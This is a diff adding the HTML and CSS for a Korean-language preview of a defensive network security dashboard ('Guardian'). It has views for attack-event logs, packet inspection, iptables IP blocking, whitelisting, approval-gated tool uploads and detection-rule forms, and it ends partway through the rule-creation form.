@@ -1,0 +1,2106 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>보안 정책 자동화 대시보드</title>
+<style>
+/* Streamlit 기본 테마(라이트/다크 자동)를 따라 한 스타일 */
+:root{--bg:#fff;--bg2:#f0f2f6;--text:#31333f;--mute:rgba(49,51,63,.6);--line:rgba(49,51,63,.2);--primary:#ff4b4b;
+ --ok-bg:rgba(33,195,84,.1);--ok:#177233;--info-bg:rgba(28,131,225,.1);--info:#004280;
+ --warn-bg:rgba(255,227,18,.1);--warn:#926c05;--err-bg:rgba(255,43,43,.09);--err:#7d353b;--up:#09ab3b;--down:#ff2b2b;--chart:#1c83e1}
+@media (prefers-color-scheme: dark){:root{--bg:#0e1117;--bg2:#262730;--text:#fafafa;--mute:rgba(250,250,250,.6);--line:rgba(250,250,250,.2);
+ --ok-bg:rgba(61,213,109,.2);--ok:#dffde9;--info-bg:rgba(61,157,243,.2);--info:#c7ebff;
+ --warn-bg:rgba(255,227,18,.2);--warn:#ffffc2;--err-bg:rgba(255,108,108,.2);--err:#ffdede;--up:#09ab3b;--down:#ff4b4b;--chart:#3d9df3}}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font:16px/1.6 "Source Sans Pro","Malgun Gothic","Noto Sans KR",sans-serif}
+.page{padding:1.25rem 3rem 4rem;flex:1;min-width:0}
+@media (max-width:800px){.page{padding:1rem 1rem 3rem}}
+h1{font-size:1.25rem;font-weight:600;margin:0 0 .25rem;color:var(--mute)}
+h2{font-size:1.6rem;font-weight:600;margin:.5rem 0 .5rem;padding:.25rem 0}
+h3{font-size:1.5rem;font-weight:600;margin:1.2rem 0 .5rem}
+p{margin:0 0 1rem}
+.caption{color:var(--mute);font-size:14px}
+.conn{margin-left:.6rem;font-size:13px;padding:1px 8px;border-radius:99px;background:var(--bg2)}
+.conn.ok{color:var(--up)}.conn.bad{color:var(--down)}
+hr{border:0;border-top:1px solid var(--line);margin:2rem 0}
+code{background:var(--bg2);padding:.1em .4em;border-radius:.25rem;font-size:.85em}
+/* metric */
+.metrics{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1rem}
+.metric .label{font-size:14px;color:var(--text)}
+.metric .value{font-size:2.25rem;line-height:1.3}
+.metric .delta{font-size:14px}
+.metric .delta.up{color:var(--up)}.metric .delta.down{color:var(--down)}.metric .delta.flat{color:var(--mute)}
+/* dataframe */
+.df{border:1px solid var(--line);border-radius:.5rem;overflow:auto;max-height:420px;margin-bottom:1rem}
+.df table{width:100%;border-collapse:collapse;font-size:14px}
+.df th{position:sticky;top:0;background:var(--bg2);text-align:left;font-weight:400;color:var(--mute)}
+.df th,.df td{padding:.4rem .75rem;border-bottom:1px solid var(--line);white-space:nowrap}
+.df td.wrap{white-space:normal;min-width:220px}
+.sev-Critical,.sev-High{color:var(--down);font-weight:600}.sev-Medium{color:var(--warn)}.sev-Low{color:var(--info)}
+/* widgets */
+.lbl{display:block;font-size:14px;margin:.5rem 0 .25rem}
+.txt,select{width:100%;max-width:520px;background:var(--bg2);color:var(--text);border:1px solid transparent;border-radius:.5rem;padding:.5rem .75rem;font:inherit}
+select{width:auto}
+.txt:focus,select:focus{outline:0;border-color:var(--primary)}
+.btn{display:inline-block;margin:.75rem 0;background:var(--bg);color:var(--text);border:1px solid var(--line);border-radius:.5rem;padding:.35rem .9rem;font:inherit;cursor:pointer}
+.btn:hover{border-color:var(--primary);color:var(--primary)}
+.btn.primary{background:var(--primary);border-color:var(--primary);color:#fff}
+.btn.sm{margin:0;padding:.1rem .6rem;font-size:14px}
+.field-row{margin-bottom:.75rem}
+.alert{border-radius:.5rem;padding:1rem;margin:.5rem 0 1rem}
+.alert.success{background:var(--ok-bg);color:var(--ok)}.alert.info{background:var(--info-bg);color:var(--info)}
+.alert.warning{background:var(--warn-bg);color:var(--warn)}.alert.error{background:var(--err-bg);color:var(--err)}
+.expander{border:1px solid var(--line);border-radius:.5rem;margin-bottom:1rem}
+.expander>summary{padding:.75rem 1rem;cursor:pointer}
+.expander>div,.expander>pre{padding:0 1rem 1rem}
+.plugin{border:1px solid var(--line);border-radius:.5rem;padding:1rem;margin-bottom:1rem}
+.plugin h4{margin:0 0 .25rem;font-size:1.1rem;font-weight:600}
+.plugin .row{display:flex;gap:.75rem;flex-wrap:wrap;align-items:flex-end}
+.plugin .row label{font-size:14px}
+.plugin .row .txt{display:block;width:180px}
+.tag{font-size:12px;font-weight:400;padding:1px 8px;border-radius:99px;background:var(--bg2);color:var(--mute);margin-left:.4rem}
+pre{background:var(--bg2);padding:1rem;border-radius:.5rem;max-height:280px;overflow:auto;font:13px/1.45 "Source Code Pro",Consolas,monospace;white-space:pre-wrap;margin:.75rem 0 0}
+#login{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:5}
+#login[hidden]{display:none}
+#loginForm{width:min(420px,92vw)}
+[hidden]{display:none!important}
+#blockForm .btn{display:block}
+.dur{display:flex;gap:1rem;flex-wrap:wrap;align-items:center;margin-bottom:.25rem}
+.dur label{display:flex;align-items:center;gap:.4rem;font-size:14px}
+.dur .num{width:90px}
+.dur .chk{margin-left:.5rem}
+.dur.off label:not(.chk){opacity:.4}
+.note-edit{display:flex;gap:.4rem;align-items:center}
+.note-edit .txt{width:200px;padding:.15rem .5rem;font-size:14px}
+.tagline{white-space:normal!important;min-width:180px}
+.ruleform{padding:0 1rem 1rem;display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:.6rem 1rem}
+.ruleform label{font-size:14px;display:block}
+.ruleform .txt{margin-top:.25rem}
+.ruleform .chk{align-self:end}
+.ruleform .btn{align-self:end;justify-self:start}
+.perr{background:var(--err-bg);color:var(--err);border-radius:.5rem;padding:.5rem 1rem;margin:.3rem 0;font-size:14px}
+.plugin>summary{cursor:pointer;list-style:none;font-size:1.1rem}
+.plugin>summary::-webkit-details-marker{display:none}
+.plugin>summary::before{content:"▸";display:inline-block;width:1.2em;color:var(--mute)}
+.plugin[open]>summary::before{content:"▾"}
+.plugin[open]>summary{margin-bottom:.5rem}
+.tag.live{color:var(--up)}
+.subh{margin:1rem 0 .4rem;font-size:1rem;font-weight:600}
+.rulebar{display:flex;gap:.6rem;flex-wrap:wrap;align-items:center;margin:.25rem 0 .75rem}
+.rulebar .txt{flex:1 1 280px;max-width:420px}
+dialog{border:1px solid var(--line);border-radius:.75rem;background:var(--bg);color:var(--text);padding:1.25rem 1.5rem;width:min(560px,92vw)}
+dialog::backdrop{background:rgba(0,0,0,.45)}
+dialog h3{margin:0 0 .75rem}
+#delBody{display:grid;grid-template-columns:7rem 1fr;gap:.35rem .75rem;margin:0 0 .75rem;font-size:14px}
+#delBody dt{color:var(--mute)}#delBody dd{margin:0;word-break:break-word}
+.dlgbtns{display:flex;gap:.5rem;justify-content:flex-end}
+#ruleTypeDialog .dlgbtns{justify-content:stretch}
+#ruleTypeDialog .dlgbtns .btn{flex:1;padding:1rem .75rem;line-height:1.5}
+#ruleTypeDialog .dlgbtns .btn:last-child{flex:0}
+.sortbox{display:flex;align-items:center;gap:.4rem;font-size:14px}
+#ruleRev.on{background:var(--primary);border-color:var(--primary);color:#fff}
+.filterbox{margin-bottom:.75rem}
+.filterbox>summary{font-size:14px;padding:.45rem 1rem}
+.filters{display:flex;gap:.6rem;flex-wrap:wrap;padding:0 1rem 1rem}
+.acts{white-space:nowrap}
+.editgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:.6rem 1rem;margin-bottom:.75rem;max-height:60vh;overflow:auto;padding-right:.25rem}
+.editgrid label{font-size:14px;display:block}
+.editgrid .wide{grid-column:1/-1}
+.editgrid .txt,.editgrid select{margin-top:.25rem;width:100%;max-width:none}
+.editgrid input[type=checkbox]{margin-right:.4rem}
+.idline{color:var(--mute);font-size:13px}
+#editDialog{width:min(640px,94vw)}
+.ruleform .wide{grid-column:1/-1}
+.switch{display:inline-flex;align-items:center;gap:.6rem;cursor:pointer;font-size:14px}
+.switch input{position:absolute;opacity:0;width:0;height:0}
+.switch .slider{position:relative;width:44px;height:24px;border-radius:99px;background:var(--line);transition:background .15s;flex:none}
+.switch .slider::after{content:"";position:absolute;top:3px;left:3px;width:18px;height:18px;border-radius:50%;background:#fff;transition:transform .15s}
+.switch input:checked+.slider{background:var(--primary)}
+.switch input:checked+.slider::after{transform:translateX(20px)}
+.switch input:focus-visible+.slider{outline:2px solid var(--primary);outline-offset:2px}
+.blockctl .blockdur{margin-top:.6rem}
+.blockctl .dur{margin-top:.25rem}
+.blockctl .dur .num{width:84px;margin:0}
+.blockctl .switch{display:inline-flex}
+.blockctl .dur label{display:flex;align-items:center;gap:.4rem;font-size:14px}
+.ruleform .txt,.ruleform select{display:block;margin-top:.25rem;width:100%;max-width:none}
+.ruleform .num{width:100%}
+.ruleform select,.editgrid select{height:40px}
+.metric .delta .switch{margin-top:.25rem}
+#evDialog{width:min(720px,94vw)}
+#evBody{max-height:62vh;overflow:auto;padding-right:.25rem;margin-bottom:.75rem}
+.evsec h4{margin:.9rem 0 .2rem;font-size:1rem;font-weight:600}
+.evsec ul{margin:0;padding-left:1.2rem;font-size:14px}
+.evsec li{margin:.15rem 0}
+.evdl{display:grid;grid-template-columns:9rem 1fr;gap:.3rem .75rem;margin:0;font-size:13px}
+.evdl dt{color:var(--mute)}.evdl dd{margin:0;word-break:break-word}
+label.inline{display:inline-flex;align-items:center;gap:.4rem;font-size:14px}
+#pkRows tr.icmp td{background:var(--info-bg)}
+#pkRows tr.arp td{background:var(--warn-bg)}
+#pkRows tr.out td:nth-child(3){color:var(--mute)}
+#pkRows td:nth-child(8){white-space:normal;min-width:240px}
+#pkRows td{font-family:"Source Code Pro",Consolas,monospace;font-size:13px}
+/* 왼쪽 메뉴: 화면을 메뉴별로 나눠 한 화면에 한 가지만 보여줌 (스크롤 줄이기) */
+.layout{display:flex;align-items:flex-start;min-height:100vh}
+.sidebar{position:sticky;top:0;align-self:flex-start;width:220px;flex:none;height:100vh;overflow:auto;background:var(--bg2);padding:1.25rem .75rem;display:flex;flex-direction:column;gap:.15rem}
+.brand{font-size:1.15rem;font-weight:700;padding:.25rem .75rem 1rem}
+.navitem{display:flex;align-items:center;gap:.65rem;padding:.55rem .75rem;border-radius:.5rem;color:var(--text);text-decoration:none;font-size:15px}
+.navitem:hover{background:var(--line)}
+.navitem.active{background:var(--bg);font-weight:600;box-shadow:inset 3px 0 0 var(--primary)}
+.navitem .ico{width:1.4rem;text-align:center}
+.sidefoot{margin-top:auto;padding:.75rem .25rem 0;display:flex;flex-direction:column;gap:.35rem;align-items:flex-start}
+.sidefoot .conn{margin:0;background:var(--bg);word-break:break-word}
+.sidefoot .btn{margin:0}
+#modeBadge{font-weight:600}
+#modeBadge.real{color:var(--down)}
+.navbadge{margin-left:auto;background:var(--down);color:#fff;border-radius:99px;padding:0 .45rem;font-size:12px;font-weight:600}
+@media (max-width:800px){
+  .layout{flex-direction:column;align-items:stretch}
+  .layout{width:100%;min-width:0}
+  .sidebar{position:static;width:100%;min-width:0;height:auto;flex-direction:row;flex-wrap:nowrap;overflow-x:auto;padding:.5rem;gap:.25rem}
+  .navitem,.sidefoot{flex:none}
+  .page{width:100%}
+  .brand{display:none}
+  .sidefoot{margin:0;flex-direction:row;align-items:center;padding:0 .25rem;white-space:nowrap}
+  #lastOk,#soundBtn,#logoutBtn{display:none}
+  .navitem{white-space:nowrap}
+}
+/* 도구 카드 (사진의 플러그인 목록처럼 격자 + 이름 밑 #태그) */
+.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:1rem;margin-bottom:1rem}
+.pcard{background:var(--bg2);border-radius:.6rem;padding:1rem 1.2rem;display:flex;flex-direction:column;gap:.35rem;min-height:130px}
+.pc-head{display:flex;align-items:center;gap:.5rem}
+.pc-title{flex:1;min-width:0;font-size:1.05rem;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.pc-acts{display:flex;align-items:center;gap:.5rem;flex:none}
+.iconbtn{background:transparent;border:0;color:var(--mute);font-size:18px;line-height:1;cursor:pointer;padding:.2rem .3rem;border-radius:.4rem}
+.iconbtn:hover{color:var(--primary);background:var(--line)}
+.pc-desc{margin:0;font-size:14px;color:var(--text);flex:1}
+.pc-foot{display:flex;gap:.4rem;flex-wrap:wrap;align-items:center}
+.pc-foot .tag{margin:0;background:var(--bg)}
+a.btn{text-decoration:none}
+.pcard.off{opacity:.6}
+.pcard.sev-critical{box-shadow:inset 3px 0 0 var(--down)}
+.pcard.sev-warning{box-shadow:inset 3px 0 0 var(--warn)}
+.pcard.sev-info{box-shadow:inset 3px 0 0 var(--info)}
+.pc-cond{margin:0}
+.pc-foot .sev-Critical,.pc-foot .sev-Medium,.pc-foot .sev-Low{font-weight:600}
+.ptags{display:flex;gap:.35rem;flex-wrap:wrap;margin:0 0 .5rem}
+.pcard .ptags{margin:0}
+.ptag{font-size:12px;padding:0 .6rem;border-radius:99px;border:1px solid var(--line);background:var(--bg);color:var(--mute);cursor:pointer;font:inherit;font-size:12px;line-height:1.7}
+.ptag:hover,.ptag.on{border-color:var(--primary);color:var(--primary)}
+.ptag.on{background:var(--err-bg)}
+span.ptag{cursor:default}
+#pluginDialog{width:min(640px,94vw)}
+#pluginDialog .row{display:flex;gap:.75rem;flex-wrap:wrap;align-items:flex-end;margin-bottom:.5rem}
+#pluginDialog .row label{font-size:14px}
+#pluginDialog .row .txt{display:block;width:180px}
+#pluginDialog .row .btn{margin:0}
+#pdOut{margin-bottom:.75rem}
+/* 도구 결과 화면 표시 (@gui) */
+.gmetrics{grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:.75rem;margin-bottom:1rem}
+.gcard{border:1px solid var(--line);border-radius:.5rem;padding:.5rem .75rem}
+.gcard .value{font-size:1.6rem}
+.gmeter{height:8px;background:var(--bg2);border-radius:4px;overflow:hidden;margin-top:.25rem}
+.gmeter .fill{height:100%;background:var(--chart)}
+.gmeter .fill.hot{background:var(--down)}
+.gwide h4{margin:.25rem 0 .4rem;font-size:15px;font-weight:600}
+.gwide{margin-bottom:1rem}
+.gchart{height:90px}
+.stale{opacity:.45}
+.tag.sim{color:var(--warn);background:var(--warn-bg)}
+textarea.txt.desc{resize:none;overflow:hidden;line-height:1.45;font:inherit;white-space:pre-wrap;overflow-wrap:anywhere}
+.tag.memo{color:var(--text);border:1px solid var(--line,rgba(128,128,128,.35));white-space:nowrap;max-width:16em;overflow:hidden;text-overflow:ellipsis;display:inline-block;vertical-align:middle;line-height:1.4}
+.linkbtn{background:none;border:0;padding:0;color:inherit;font:inherit;text-decoration:underline dotted;cursor:pointer}
+.linkbtn:hover{color:var(--primary)}
+.field-row .rulebar{margin:0}
+#toasts{position:fixed;right:1rem;bottom:1rem;display:flex;flex-direction:column;gap:.5rem;z-index:4;max-width:min(380px,90vw)}
+.toast{background:var(--bg);color:var(--text);border:1px solid var(--line);border-left:4px solid var(--warn);border-radius:.5rem;padding:.6rem .9rem;font-size:14px;cursor:pointer;box-shadow:0 4px 16px rgba(0,0,0,.25);text-align:left;font-family:inherit}
+.toast.critical{border-left-color:var(--down)}
+#tlDialog{width:min(680px,94vw)}
+#tlBody{max-height:60vh;overflow:auto;margin-bottom:.75rem}
+.timeline{list-style:none;margin:0;padding:0 0 0 .9rem;border-left:2px solid var(--line)}
+.timeline li{position:relative;padding:.3rem 0 .5rem .5rem;font-size:14px}
+.timeline li::before{content:"";position:absolute;left:-1.25rem;top:.65rem;width:10px;height:10px;border-radius:50%;background:var(--mute);border:2px solid var(--bg)}
+.timeline li.critical::before{background:var(--down)}
+.timeline li.warning::before{background:var(--warn)}
+.timeline li.admin{color:var(--mute)}
+.timeline time{display:block;color:var(--mute);font-size:12px}
+.checks{list-style:none;margin:0 0 1rem;padding:0;font-size:15px}
+.checks li{padding:.15rem 0}
+.tchart{display:flex;align-items:flex-end;height:130px;gap:2px;border-bottom:1px solid var(--line)}
+.tcol{flex:1;height:100%;display:flex;align-items:flex-end;min-width:0}
+.tcol:hover{background:var(--bg2)}
+.tbar{width:100%;background:var(--chart);border-radius:4px 4px 0 0}
+.taxis{display:flex;justify-content:space-between;font-size:12px;color:var(--mute);margin:.2rem 0 .75rem}
+.chartrow{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1rem 2rem}
+.hbar{display:grid;grid-template-columns:minmax(90px,150px) 1fr 2.5rem;gap:.5rem;align-items:center;font-size:14px;padding:.15rem 0}
+.hbar .nm{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.hbar .track{height:10px}
+.hbar .fill{height:100%;background:var(--chart);border-radius:0 4px 4px 0;min-width:2px}
+.hbar .val{text-align:right;color:var(--mute)}
+@media print{
+  :root{--bg:#fff;--bg2:#f0f2f6;--text:#31333f;--mute:rgba(49,51,63,.6);--line:rgba(49,51,63,.2)}
+  .sidebar,#toasts,.noprint,#downBanner,h1{display:none!important}
+  .page{padding:0}
+  .print-full{max-height:none;overflow:visible}
+  *{-webkit-print-color-adjust:exact;print-color-adjust:exact}
+}
+
+</style>
+</head>
+<body>
+<div style="background:#ff4b4b;color:#fff;text-align:center;padding:4px;font-size:13px">미리보기 (예시 데이터 · 서버에 연결되지 않음 · 새로고침하면 처음 상태)</div>
+<div id="login" hidden>
+  <form id="loginForm">
+    <h2>🔐 로그인</h2>
+    <p>보안 서버에서 <code>python3 dashboard/server.py</code> 를 실행할 때 출력된 <b>토큰</b>을 입력하세요.</p>
+    <input id="tokenInput" type="password" placeholder="토큰" autocomplete="off">
+    <button class="btn">접속</button>
+    <div id="loginErr" class="alert error" hidden></div>
+  </form>
+</div>
+
+<div class="layout">
+<nav class="sidebar" id="sidebar" aria-label="메뉴">
+  <div class="brand">🛡️ Guardian</div>
+  <a class="navitem" href="#overview" data-view="overview"><span class="ico">📊</span><span>개요</span><span class="navbadge" id="newBadge" hidden></span></a>
+  <a class="navitem" href="#packets" data-view="packets"><span class="ico">🔍</span><span>패킷 보기</span></a>
+  <a class="navitem" href="#policy" data-view="policy"><span class="ico">⚙️</span><span>보안 정책</span></a>
+  <a class="navitem" href="#tools" data-view="tools"><span class="ico">🧰</span><span>도구</span></a>
+  <a class="navitem" href="#rules" data-view="rules"><span class="ico">🧪</span><span>탐지 규칙</span></a>
+  <a class="navitem" href="#report" data-view="report"><span class="ico">📄</span><span>점검·보고서</span></a>
+  <div class="sidefoot">
+    <span id="modeBadge" class="conn"></span>
+    <span id="conn" class="conn">연결 중…</span>
+    <span id="lastOk" class="caption"></span>
+    <button class="btn sm" id="soundBtn" type="button" title="모든 알림 소리를 한꺼번에 켜고 끔 (규칙별 설정은 탐지 규칙의 ⚙ 에서)">🔕 소리 끔</button>
+    <button class="btn sm" id="logoutBtn" type="button">로그아웃</button>
+  </div>
+</nav>
+
+<main class="page">
+  <h1>🛡️ 보안 정책 자동화 대시보드</h1>
+  <div id="downBanner" class="alert error" role="alert" hidden></div>
+
+<section class="view" data-view="overview">
+  <h2>📊 시스템 보안 상태 지표</h2>
+  <div class="metrics" id="metrics"></div>
+  <hr>
+
+  <h2>🚨 실시간 공격 탐지 로그</h2>
+  <div class="field-row">
+    <div class="rulebar">
+      <label class="sortbox">이벤트 유형 <select id="typeFilter"><option value="">전체</option></select></label>
+      <select id="evSev"><option value="">위험도: 전체</option><option value="info">Low</option><option value="warning">Medium</option><option value="critical">Critical</option></select>
+      <input id="evIp" class="txt" type="search" placeholder="🔍 IP·상세 검색" autocomplete="off">
+      <button class="btn sm" id="evCsv" type="button">⬇ CSV 받기</button>
+    </div>
+  </div>
+  <div class="df"><table>
+    <thead><tr><th>시간</th><th>출발지 IP</th><th>대상</th><th>이벤트</th><th>위험도</th><th>상태</th><th>상세</th><th>분석</th></tr></thead>
+    <tbody id="eventRows"></tbody>
+  </table></div>
+</section>
+
+<section class="view" data-view="packets" hidden>
+  <h2>🔍 패킷 보기 (실시간)</h2>
+  <p>서버를 지나가는 패킷의 헤더 요약을 와이어샤크처럼 보여줍니다 (내용은 저장하지 않음). 핑은 요청과 응답이 둘 다 보입니다.
+    PCAP 으로 받으면 헤더까지만 들어 있어 Wireshark 에 "Packet size limited during capture" 로 표시되는 것이 정상입니다.</p>
+  <div class="rulebar">
+    <select id="pkProto"><option value="">프로토콜: 전체</option><option value="ICMP">ICMP (핑)</option><option value="TCP">TCP</option>
+      <option value="UDP">UDP</option><option value="ARP">ARP</option></select>
+    <input id="pkIp" class="txt" type="search" placeholder="🔍 IP 검색 (앞부분만 써도 됨, 예: 192.168.56.2)" autocomplete="off">
+    <label class="inline" title="SSH 공격을 볼 때는 끄세요"><input id="pkHide" type="checkbox"> 대시보드·SSH 통신 숨기기</label>
+    <button class="btn sm" id="pkPause" type="button">⏸ 일시정지</button>
+    <button class="btn sm" id="pkClear" type="button">🧹 화면 지우기</button>
+    <button class="btn sm" id="pkPcap" type="button" title="지금 조건(프로토콜·IP·숨기기)에 맞는 기록을 Wireshark 로 열 수 있는 .pcap 파일로 받습니다">💾 PCAP 저장 (Wireshark)</button>
+    <span class="caption" id="pkCount"></span>
+  </div>
+  <div id="pkNotice"></div>
+  <div class="df"><table>
+    <thead><tr><th>번호</th><th>시간</th><th>방향</th><th>출발지</th><th>도착지</th><th>프로토콜</th><th>길이</th><th>정보</th></tr></thead>
+    <tbody id="pkRows"></tbody>
+  </table></div>
+</section>
+
+<section class="view" data-view="policy" hidden>
+  <h2>⚙️ 보안 정책 제어</h2>
+  <p>탐지된 위협에 대해 Guardian 방화벽(iptables) 차단을 직접 적용하거나 해제할 수 있습니다.</p>
+  <form id="blockForm">
+    <label class="lbl" for="blockTarget">차단할 공격자 IP 주소 (또는 mac:aa:bb:cc:dd:ee:ff)</label>
+    <input id="blockTarget" class="txt" required>
+    <span class="lbl">차단 기간 (직접 지정)</span>
+    <div class="dur" id="durBox">
+      <label><input id="durDay" class="txt num" type="number" min="0" max="3650" value="0"> 일</label>
+      <label><input id="durHour" class="txt num" type="number" min="0" max="23" value="0"> 시간</label>
+      <label><input id="durMin" class="txt num" type="number" min="0" max="59" value="5"> 분</label>
+      <label class="chk"><input id="blockPerm" type="checkbox"> 영구 차단 (직접 해제할 때까지)</label>
+    </div>
+    <label class="lbl" for="blockNote">메모 (선택, 200자까지)</label>
+    <input id="blockNote" class="txt" maxlength="200" placeholder="예: 시연 중 포트스캔 공격자">
+    <button class="btn">🚨 방화벽 차단 정책 적용</button>
+  </form>
+  <div id="blockMsg"></div>
+
+  <h3>현재 차단 목록</h3>
+  <div id="blockedNote"></div>
+  <div class="df"><table>
+    <thead><tr><th>대상</th><th>이유</th><th>시작</th><th>남은 시간</th><th>메모</th><th></th></tr></thead>
+    <tbody id="blockedRows"></tbody>
+  </table></div>
+
+  <h3>📒 IP별 공격 기록</h3>
+  <p class="caption">같은 IP 의 알림은 30초 동안 한 번만 기록되므로, 횟수는 "탐지된 알림 수" 입니다.</p>
+  <div class="df"><table>
+    <thead><tr><th>IP / MAC</th><th>탐지 횟수</th><th>방화벽 차단</th><th>이유별 횟수</th><th>처음</th><th>마지막</th><th>메모</th></tr></thead>
+    <tbody id="historyRows"></tbody>
+  </table></div>
+
+  <h3>🤝 화이트리스트 <span class="caption">— 자동 차단하지 않는 주소 (탐지·알림은 됩니다). 🔒 는 서버 자신의 주소라 뺄 수 없습니다</span></h3>
+  <form id="whitelistForm" class="rulebar">
+    <input id="wlTarget" class="txt" required placeholder="추가할 IP 또는 mac:aa:bb:cc:dd:ee:ff" autocomplete="off">
+    <button class="btn sm">➕ 추가</button>
+  </form>
+  <div id="whitelistMsg"></div>
+  <div id="whitelistBox"></div>
+
+  <details class="expander" id="auditBox"><summary>📝 감사 기록 (누가 언제 무엇을 조작했나)</summary>
+    <div><div class="df"><table>
+      <thead><tr><th>시간</th><th>접속 IP</th><th>작업</th><th>내용</th><th>결과</th></tr></thead>
+      <tbody id="auditRows"></tbody>
+    </table></div></div>
+  </details>
+</section>
+
+<section class="view" data-view="tools" hidden>
+  <h2>🧰 도구</h2>
+  <p>보안 스크립트·앱(범용 도구)을 수동으로 실행/중지하는 곳입니다. 아래 "도구 올리기"로 올린 뒤 관리자가 서버에서 승인하면 3초 안에 카드로 나타납니다.
+    "탐지 규칙" 메뉴의 <b>플러그인 방식</b> 규칙과는 다른 것입니다 (그쪽은 Guardian 이 주기적으로 자동 실행).
+    <button class="btn sm" id="pluginRescan" type="button">🔄 지금 다시 찾기</button></p>
+  <div class="rulebar">
+    <input id="toolSearch" class="txt" type="search" placeholder="🔍 도구 이름·설명·태그 검색 (예: 핑, 포트공격)" autocomplete="off">
+    <span class="caption" id="toolCount"></span>
+  </div>
+  <div class="ptags" id="toolTags"></div>
+  <div id="pluginErrors"></div>
+  <div id="pluginList" class="cards"></div>
+  <details class="expander" id="upBox"><summary>📤 도구 올리기 (승인 대기)</summary>
+    <div>
+      <p>도구는 여기서 <b>올리기</b>로만 추가합니다. 스크립트를 올려도 <b>바로 실행되지 않습니다</b>. 파일은 '승인 대기' 칸에만 저장되고, 관리자가 <b>보안 서버 터미널</b>에서 내용을 읽어 보고 승인해야 위 카드 목록에 나타납니다. 대시보드에는 승인 버튼이 없습니다 (토큰이 새어도 올리는 것만으로는 실행되지 않게 하려는 장치).</p>
+      <p class="caption">올릴 파일: <code>plugin.json</code> 과 스크립트(<code>.py</code> / <code>.sh</code>) 를 함께 선택하세요 (한 번에 6개, 파일당 64KB 까지). 어떻게 구성해야 하는지는 안내 PDF를 받아서 보세요.</p>
+      <div class="rulebar">
+        <a class="btn sm" href="guide_tool.pdf" download>📄 구성 안내 PDF 받기</a>
+        <input type="file" id="upFiles" multiple accept=".json,.py,.sh">
+        <button class="btn sm" id="upSend" type="button">⬆ 올리기</button>
+      </div>
+      <div id="upMsg"></div>
+      <h4 class="subh">승인 대기 중</h4>
+      <div id="upList"></div>
+    </div>
+  </details>
+</section>
+
+<section class="view" data-view="rules" hidden>
+  <h2>🧪 탐지 규칙</h2>
+  <p>Guardian 이 탐지하는 모든 규칙입니다. 규칙은 보안 서버의 <code>rules/</code> 폴더에 파일 하나씩(<code>.json</code>) 들어 있고, 아래 양식으로 추가하거나
+    파일을 넣고 고치면 재시작 없이 5초 안에 적용됩니다. 켜기/끄기/삭제도 바로 적용됩니다. 규칙은 작동 방식에 따라 둘로 나뉩니다:
+    <b>🔥 방화벽 방식</b>(Guardian 이 패킷을 직접 보고 판정)과 <b>🧩 플러그인 방식</b>(주기적으로 스크립트를 실행해 그 판정을 따름)입니다.</p>
+  <div id="ruleErrors"></div>
+  <div id="ruleNotice"></div>
+  <div class="rulebar">
+    <input id="ruleSearch" class="txt" type="search" placeholder="🔍 규칙 이름 또는 ID 검색 (예: 포트, port_scan)" autocomplete="off">
+    <label class="sortbox">정렬
+      <select id="ruleSort"><option value="sev" selected>위험도순 (높은 것 먼저)</option><option value="name">글자순 (가나다)</option>
+        <option value="block">차단 여부 (차단 먼저)</option><option value="state">상태 (켜짐 먼저)</option></select>
+    </label>
+    <button class="btn sm" id="ruleRev" type="button" aria-pressed="false" title="현재 정렬을 거꾸로">⇅ 역순</button>
+    <button class="btn sm" id="ruleFilterReset" type="button">초기화</button>
+    <span class="caption" id="ruleCount"></span>
+  </div>
+  <details class="expander filterbox"><summary id="ruleFilterSummary">🔽 필터</summary>
+    <div class="filters">
+      <select id="ruleSev"><option value="">위험도: 전체</option><option value="info">Low</option><option value="warning">Medium</option><option value="critical">Critical</option></select>
+      <select id="ruleBlock"><option value="">차단 여부: 전체</option><option value="block">차단</option><option value="alert">알림만</option></select>
+      <select id="ruleState"><option value="">상태: 전체</option><option value="on">켜짐</option><option value="off">꺼짐</option></select>
+    </div>
+  </details>
+
+  <div class="ptags" id="ruleTags"></div>
+
+  <h3 class="subh">🔥 방화벽 방식 <span class="caption">— 패킷을 직접 보고 판정 (기본 탐지기·직접 만든 규칙)</span></h3>
+  <div class="cards" id="ruleRows"></div>
+
+  <h3 class="subh">🧩 플러그인 방식 <span class="caption">— 주기적으로 스크립트를 실행해 그 판정을 따름 (rules/ 안의 전용 스크립트)</span></h3>
+  <div class="cards" id="scriptRuleRows"></div>
+
+  <button class="btn" id="ruleAddBtn" type="button">➕ 새 규칙 추가</button>
+  <dialog id="ruleTypeDialog">
+    <h3>어떤 방식으로 만들까요?</h3>
+    <p class="caption">만든 뒤에는 방식을 바꿀 수 없습니다 (삭제하고 다시 만들어야 합니다).</p>
+    <div class="dlgbtns">
+      <button class="btn" id="chooseFwBtn" type="button">🔥 방화벽 방식<br><span class="caption">패킷 조건(포트·횟수 등)으로 직접 탐지</span></button>
+      <button class="btn" id="chooseScriptBtn" type="button">🧩 플러그인 방식<br><span class="caption">스크립트를 올리고 서버에서 승인</span></button>
+      <button class="btn" id="chooseCancelBtn" type="button">취소</button>
+    </div>
+  </dialog>
+
+  <details class="expander" id="fwRuleBox">
+    <summary>🔥 방화벽 방식 규칙 추가</summary>
+    <form id="ruleForm" class="ruleform">
+      <label>규칙 ID (영소문자·숫자·밑줄)<input id="rId" class="txt" required pattern="[a-z0-9_]{1,40}" placeholder="telnet_probe"></label>
+      <label>이름<input id="rName" class="txt" maxlength="60" placeholder="텔넷 접속 시도"></label>
+      <label>태그 (선택, 공백·쉼표로 구분, 6개까지)<input id="rTags" class="txt" placeholder="#텔넷 #포트공격"></label>
+      <label class="wide">설명 (선택)<textarea id="rDesc" class="txt desc" maxlength="200" rows="1" placeholder="이 규칙이 무엇을 잡는지"></textarea></label>
+      <label>프로토콜<select id="rProto"><option>tcp</option><option>udp</option><option>icmp</option><option>any</option></select></label>
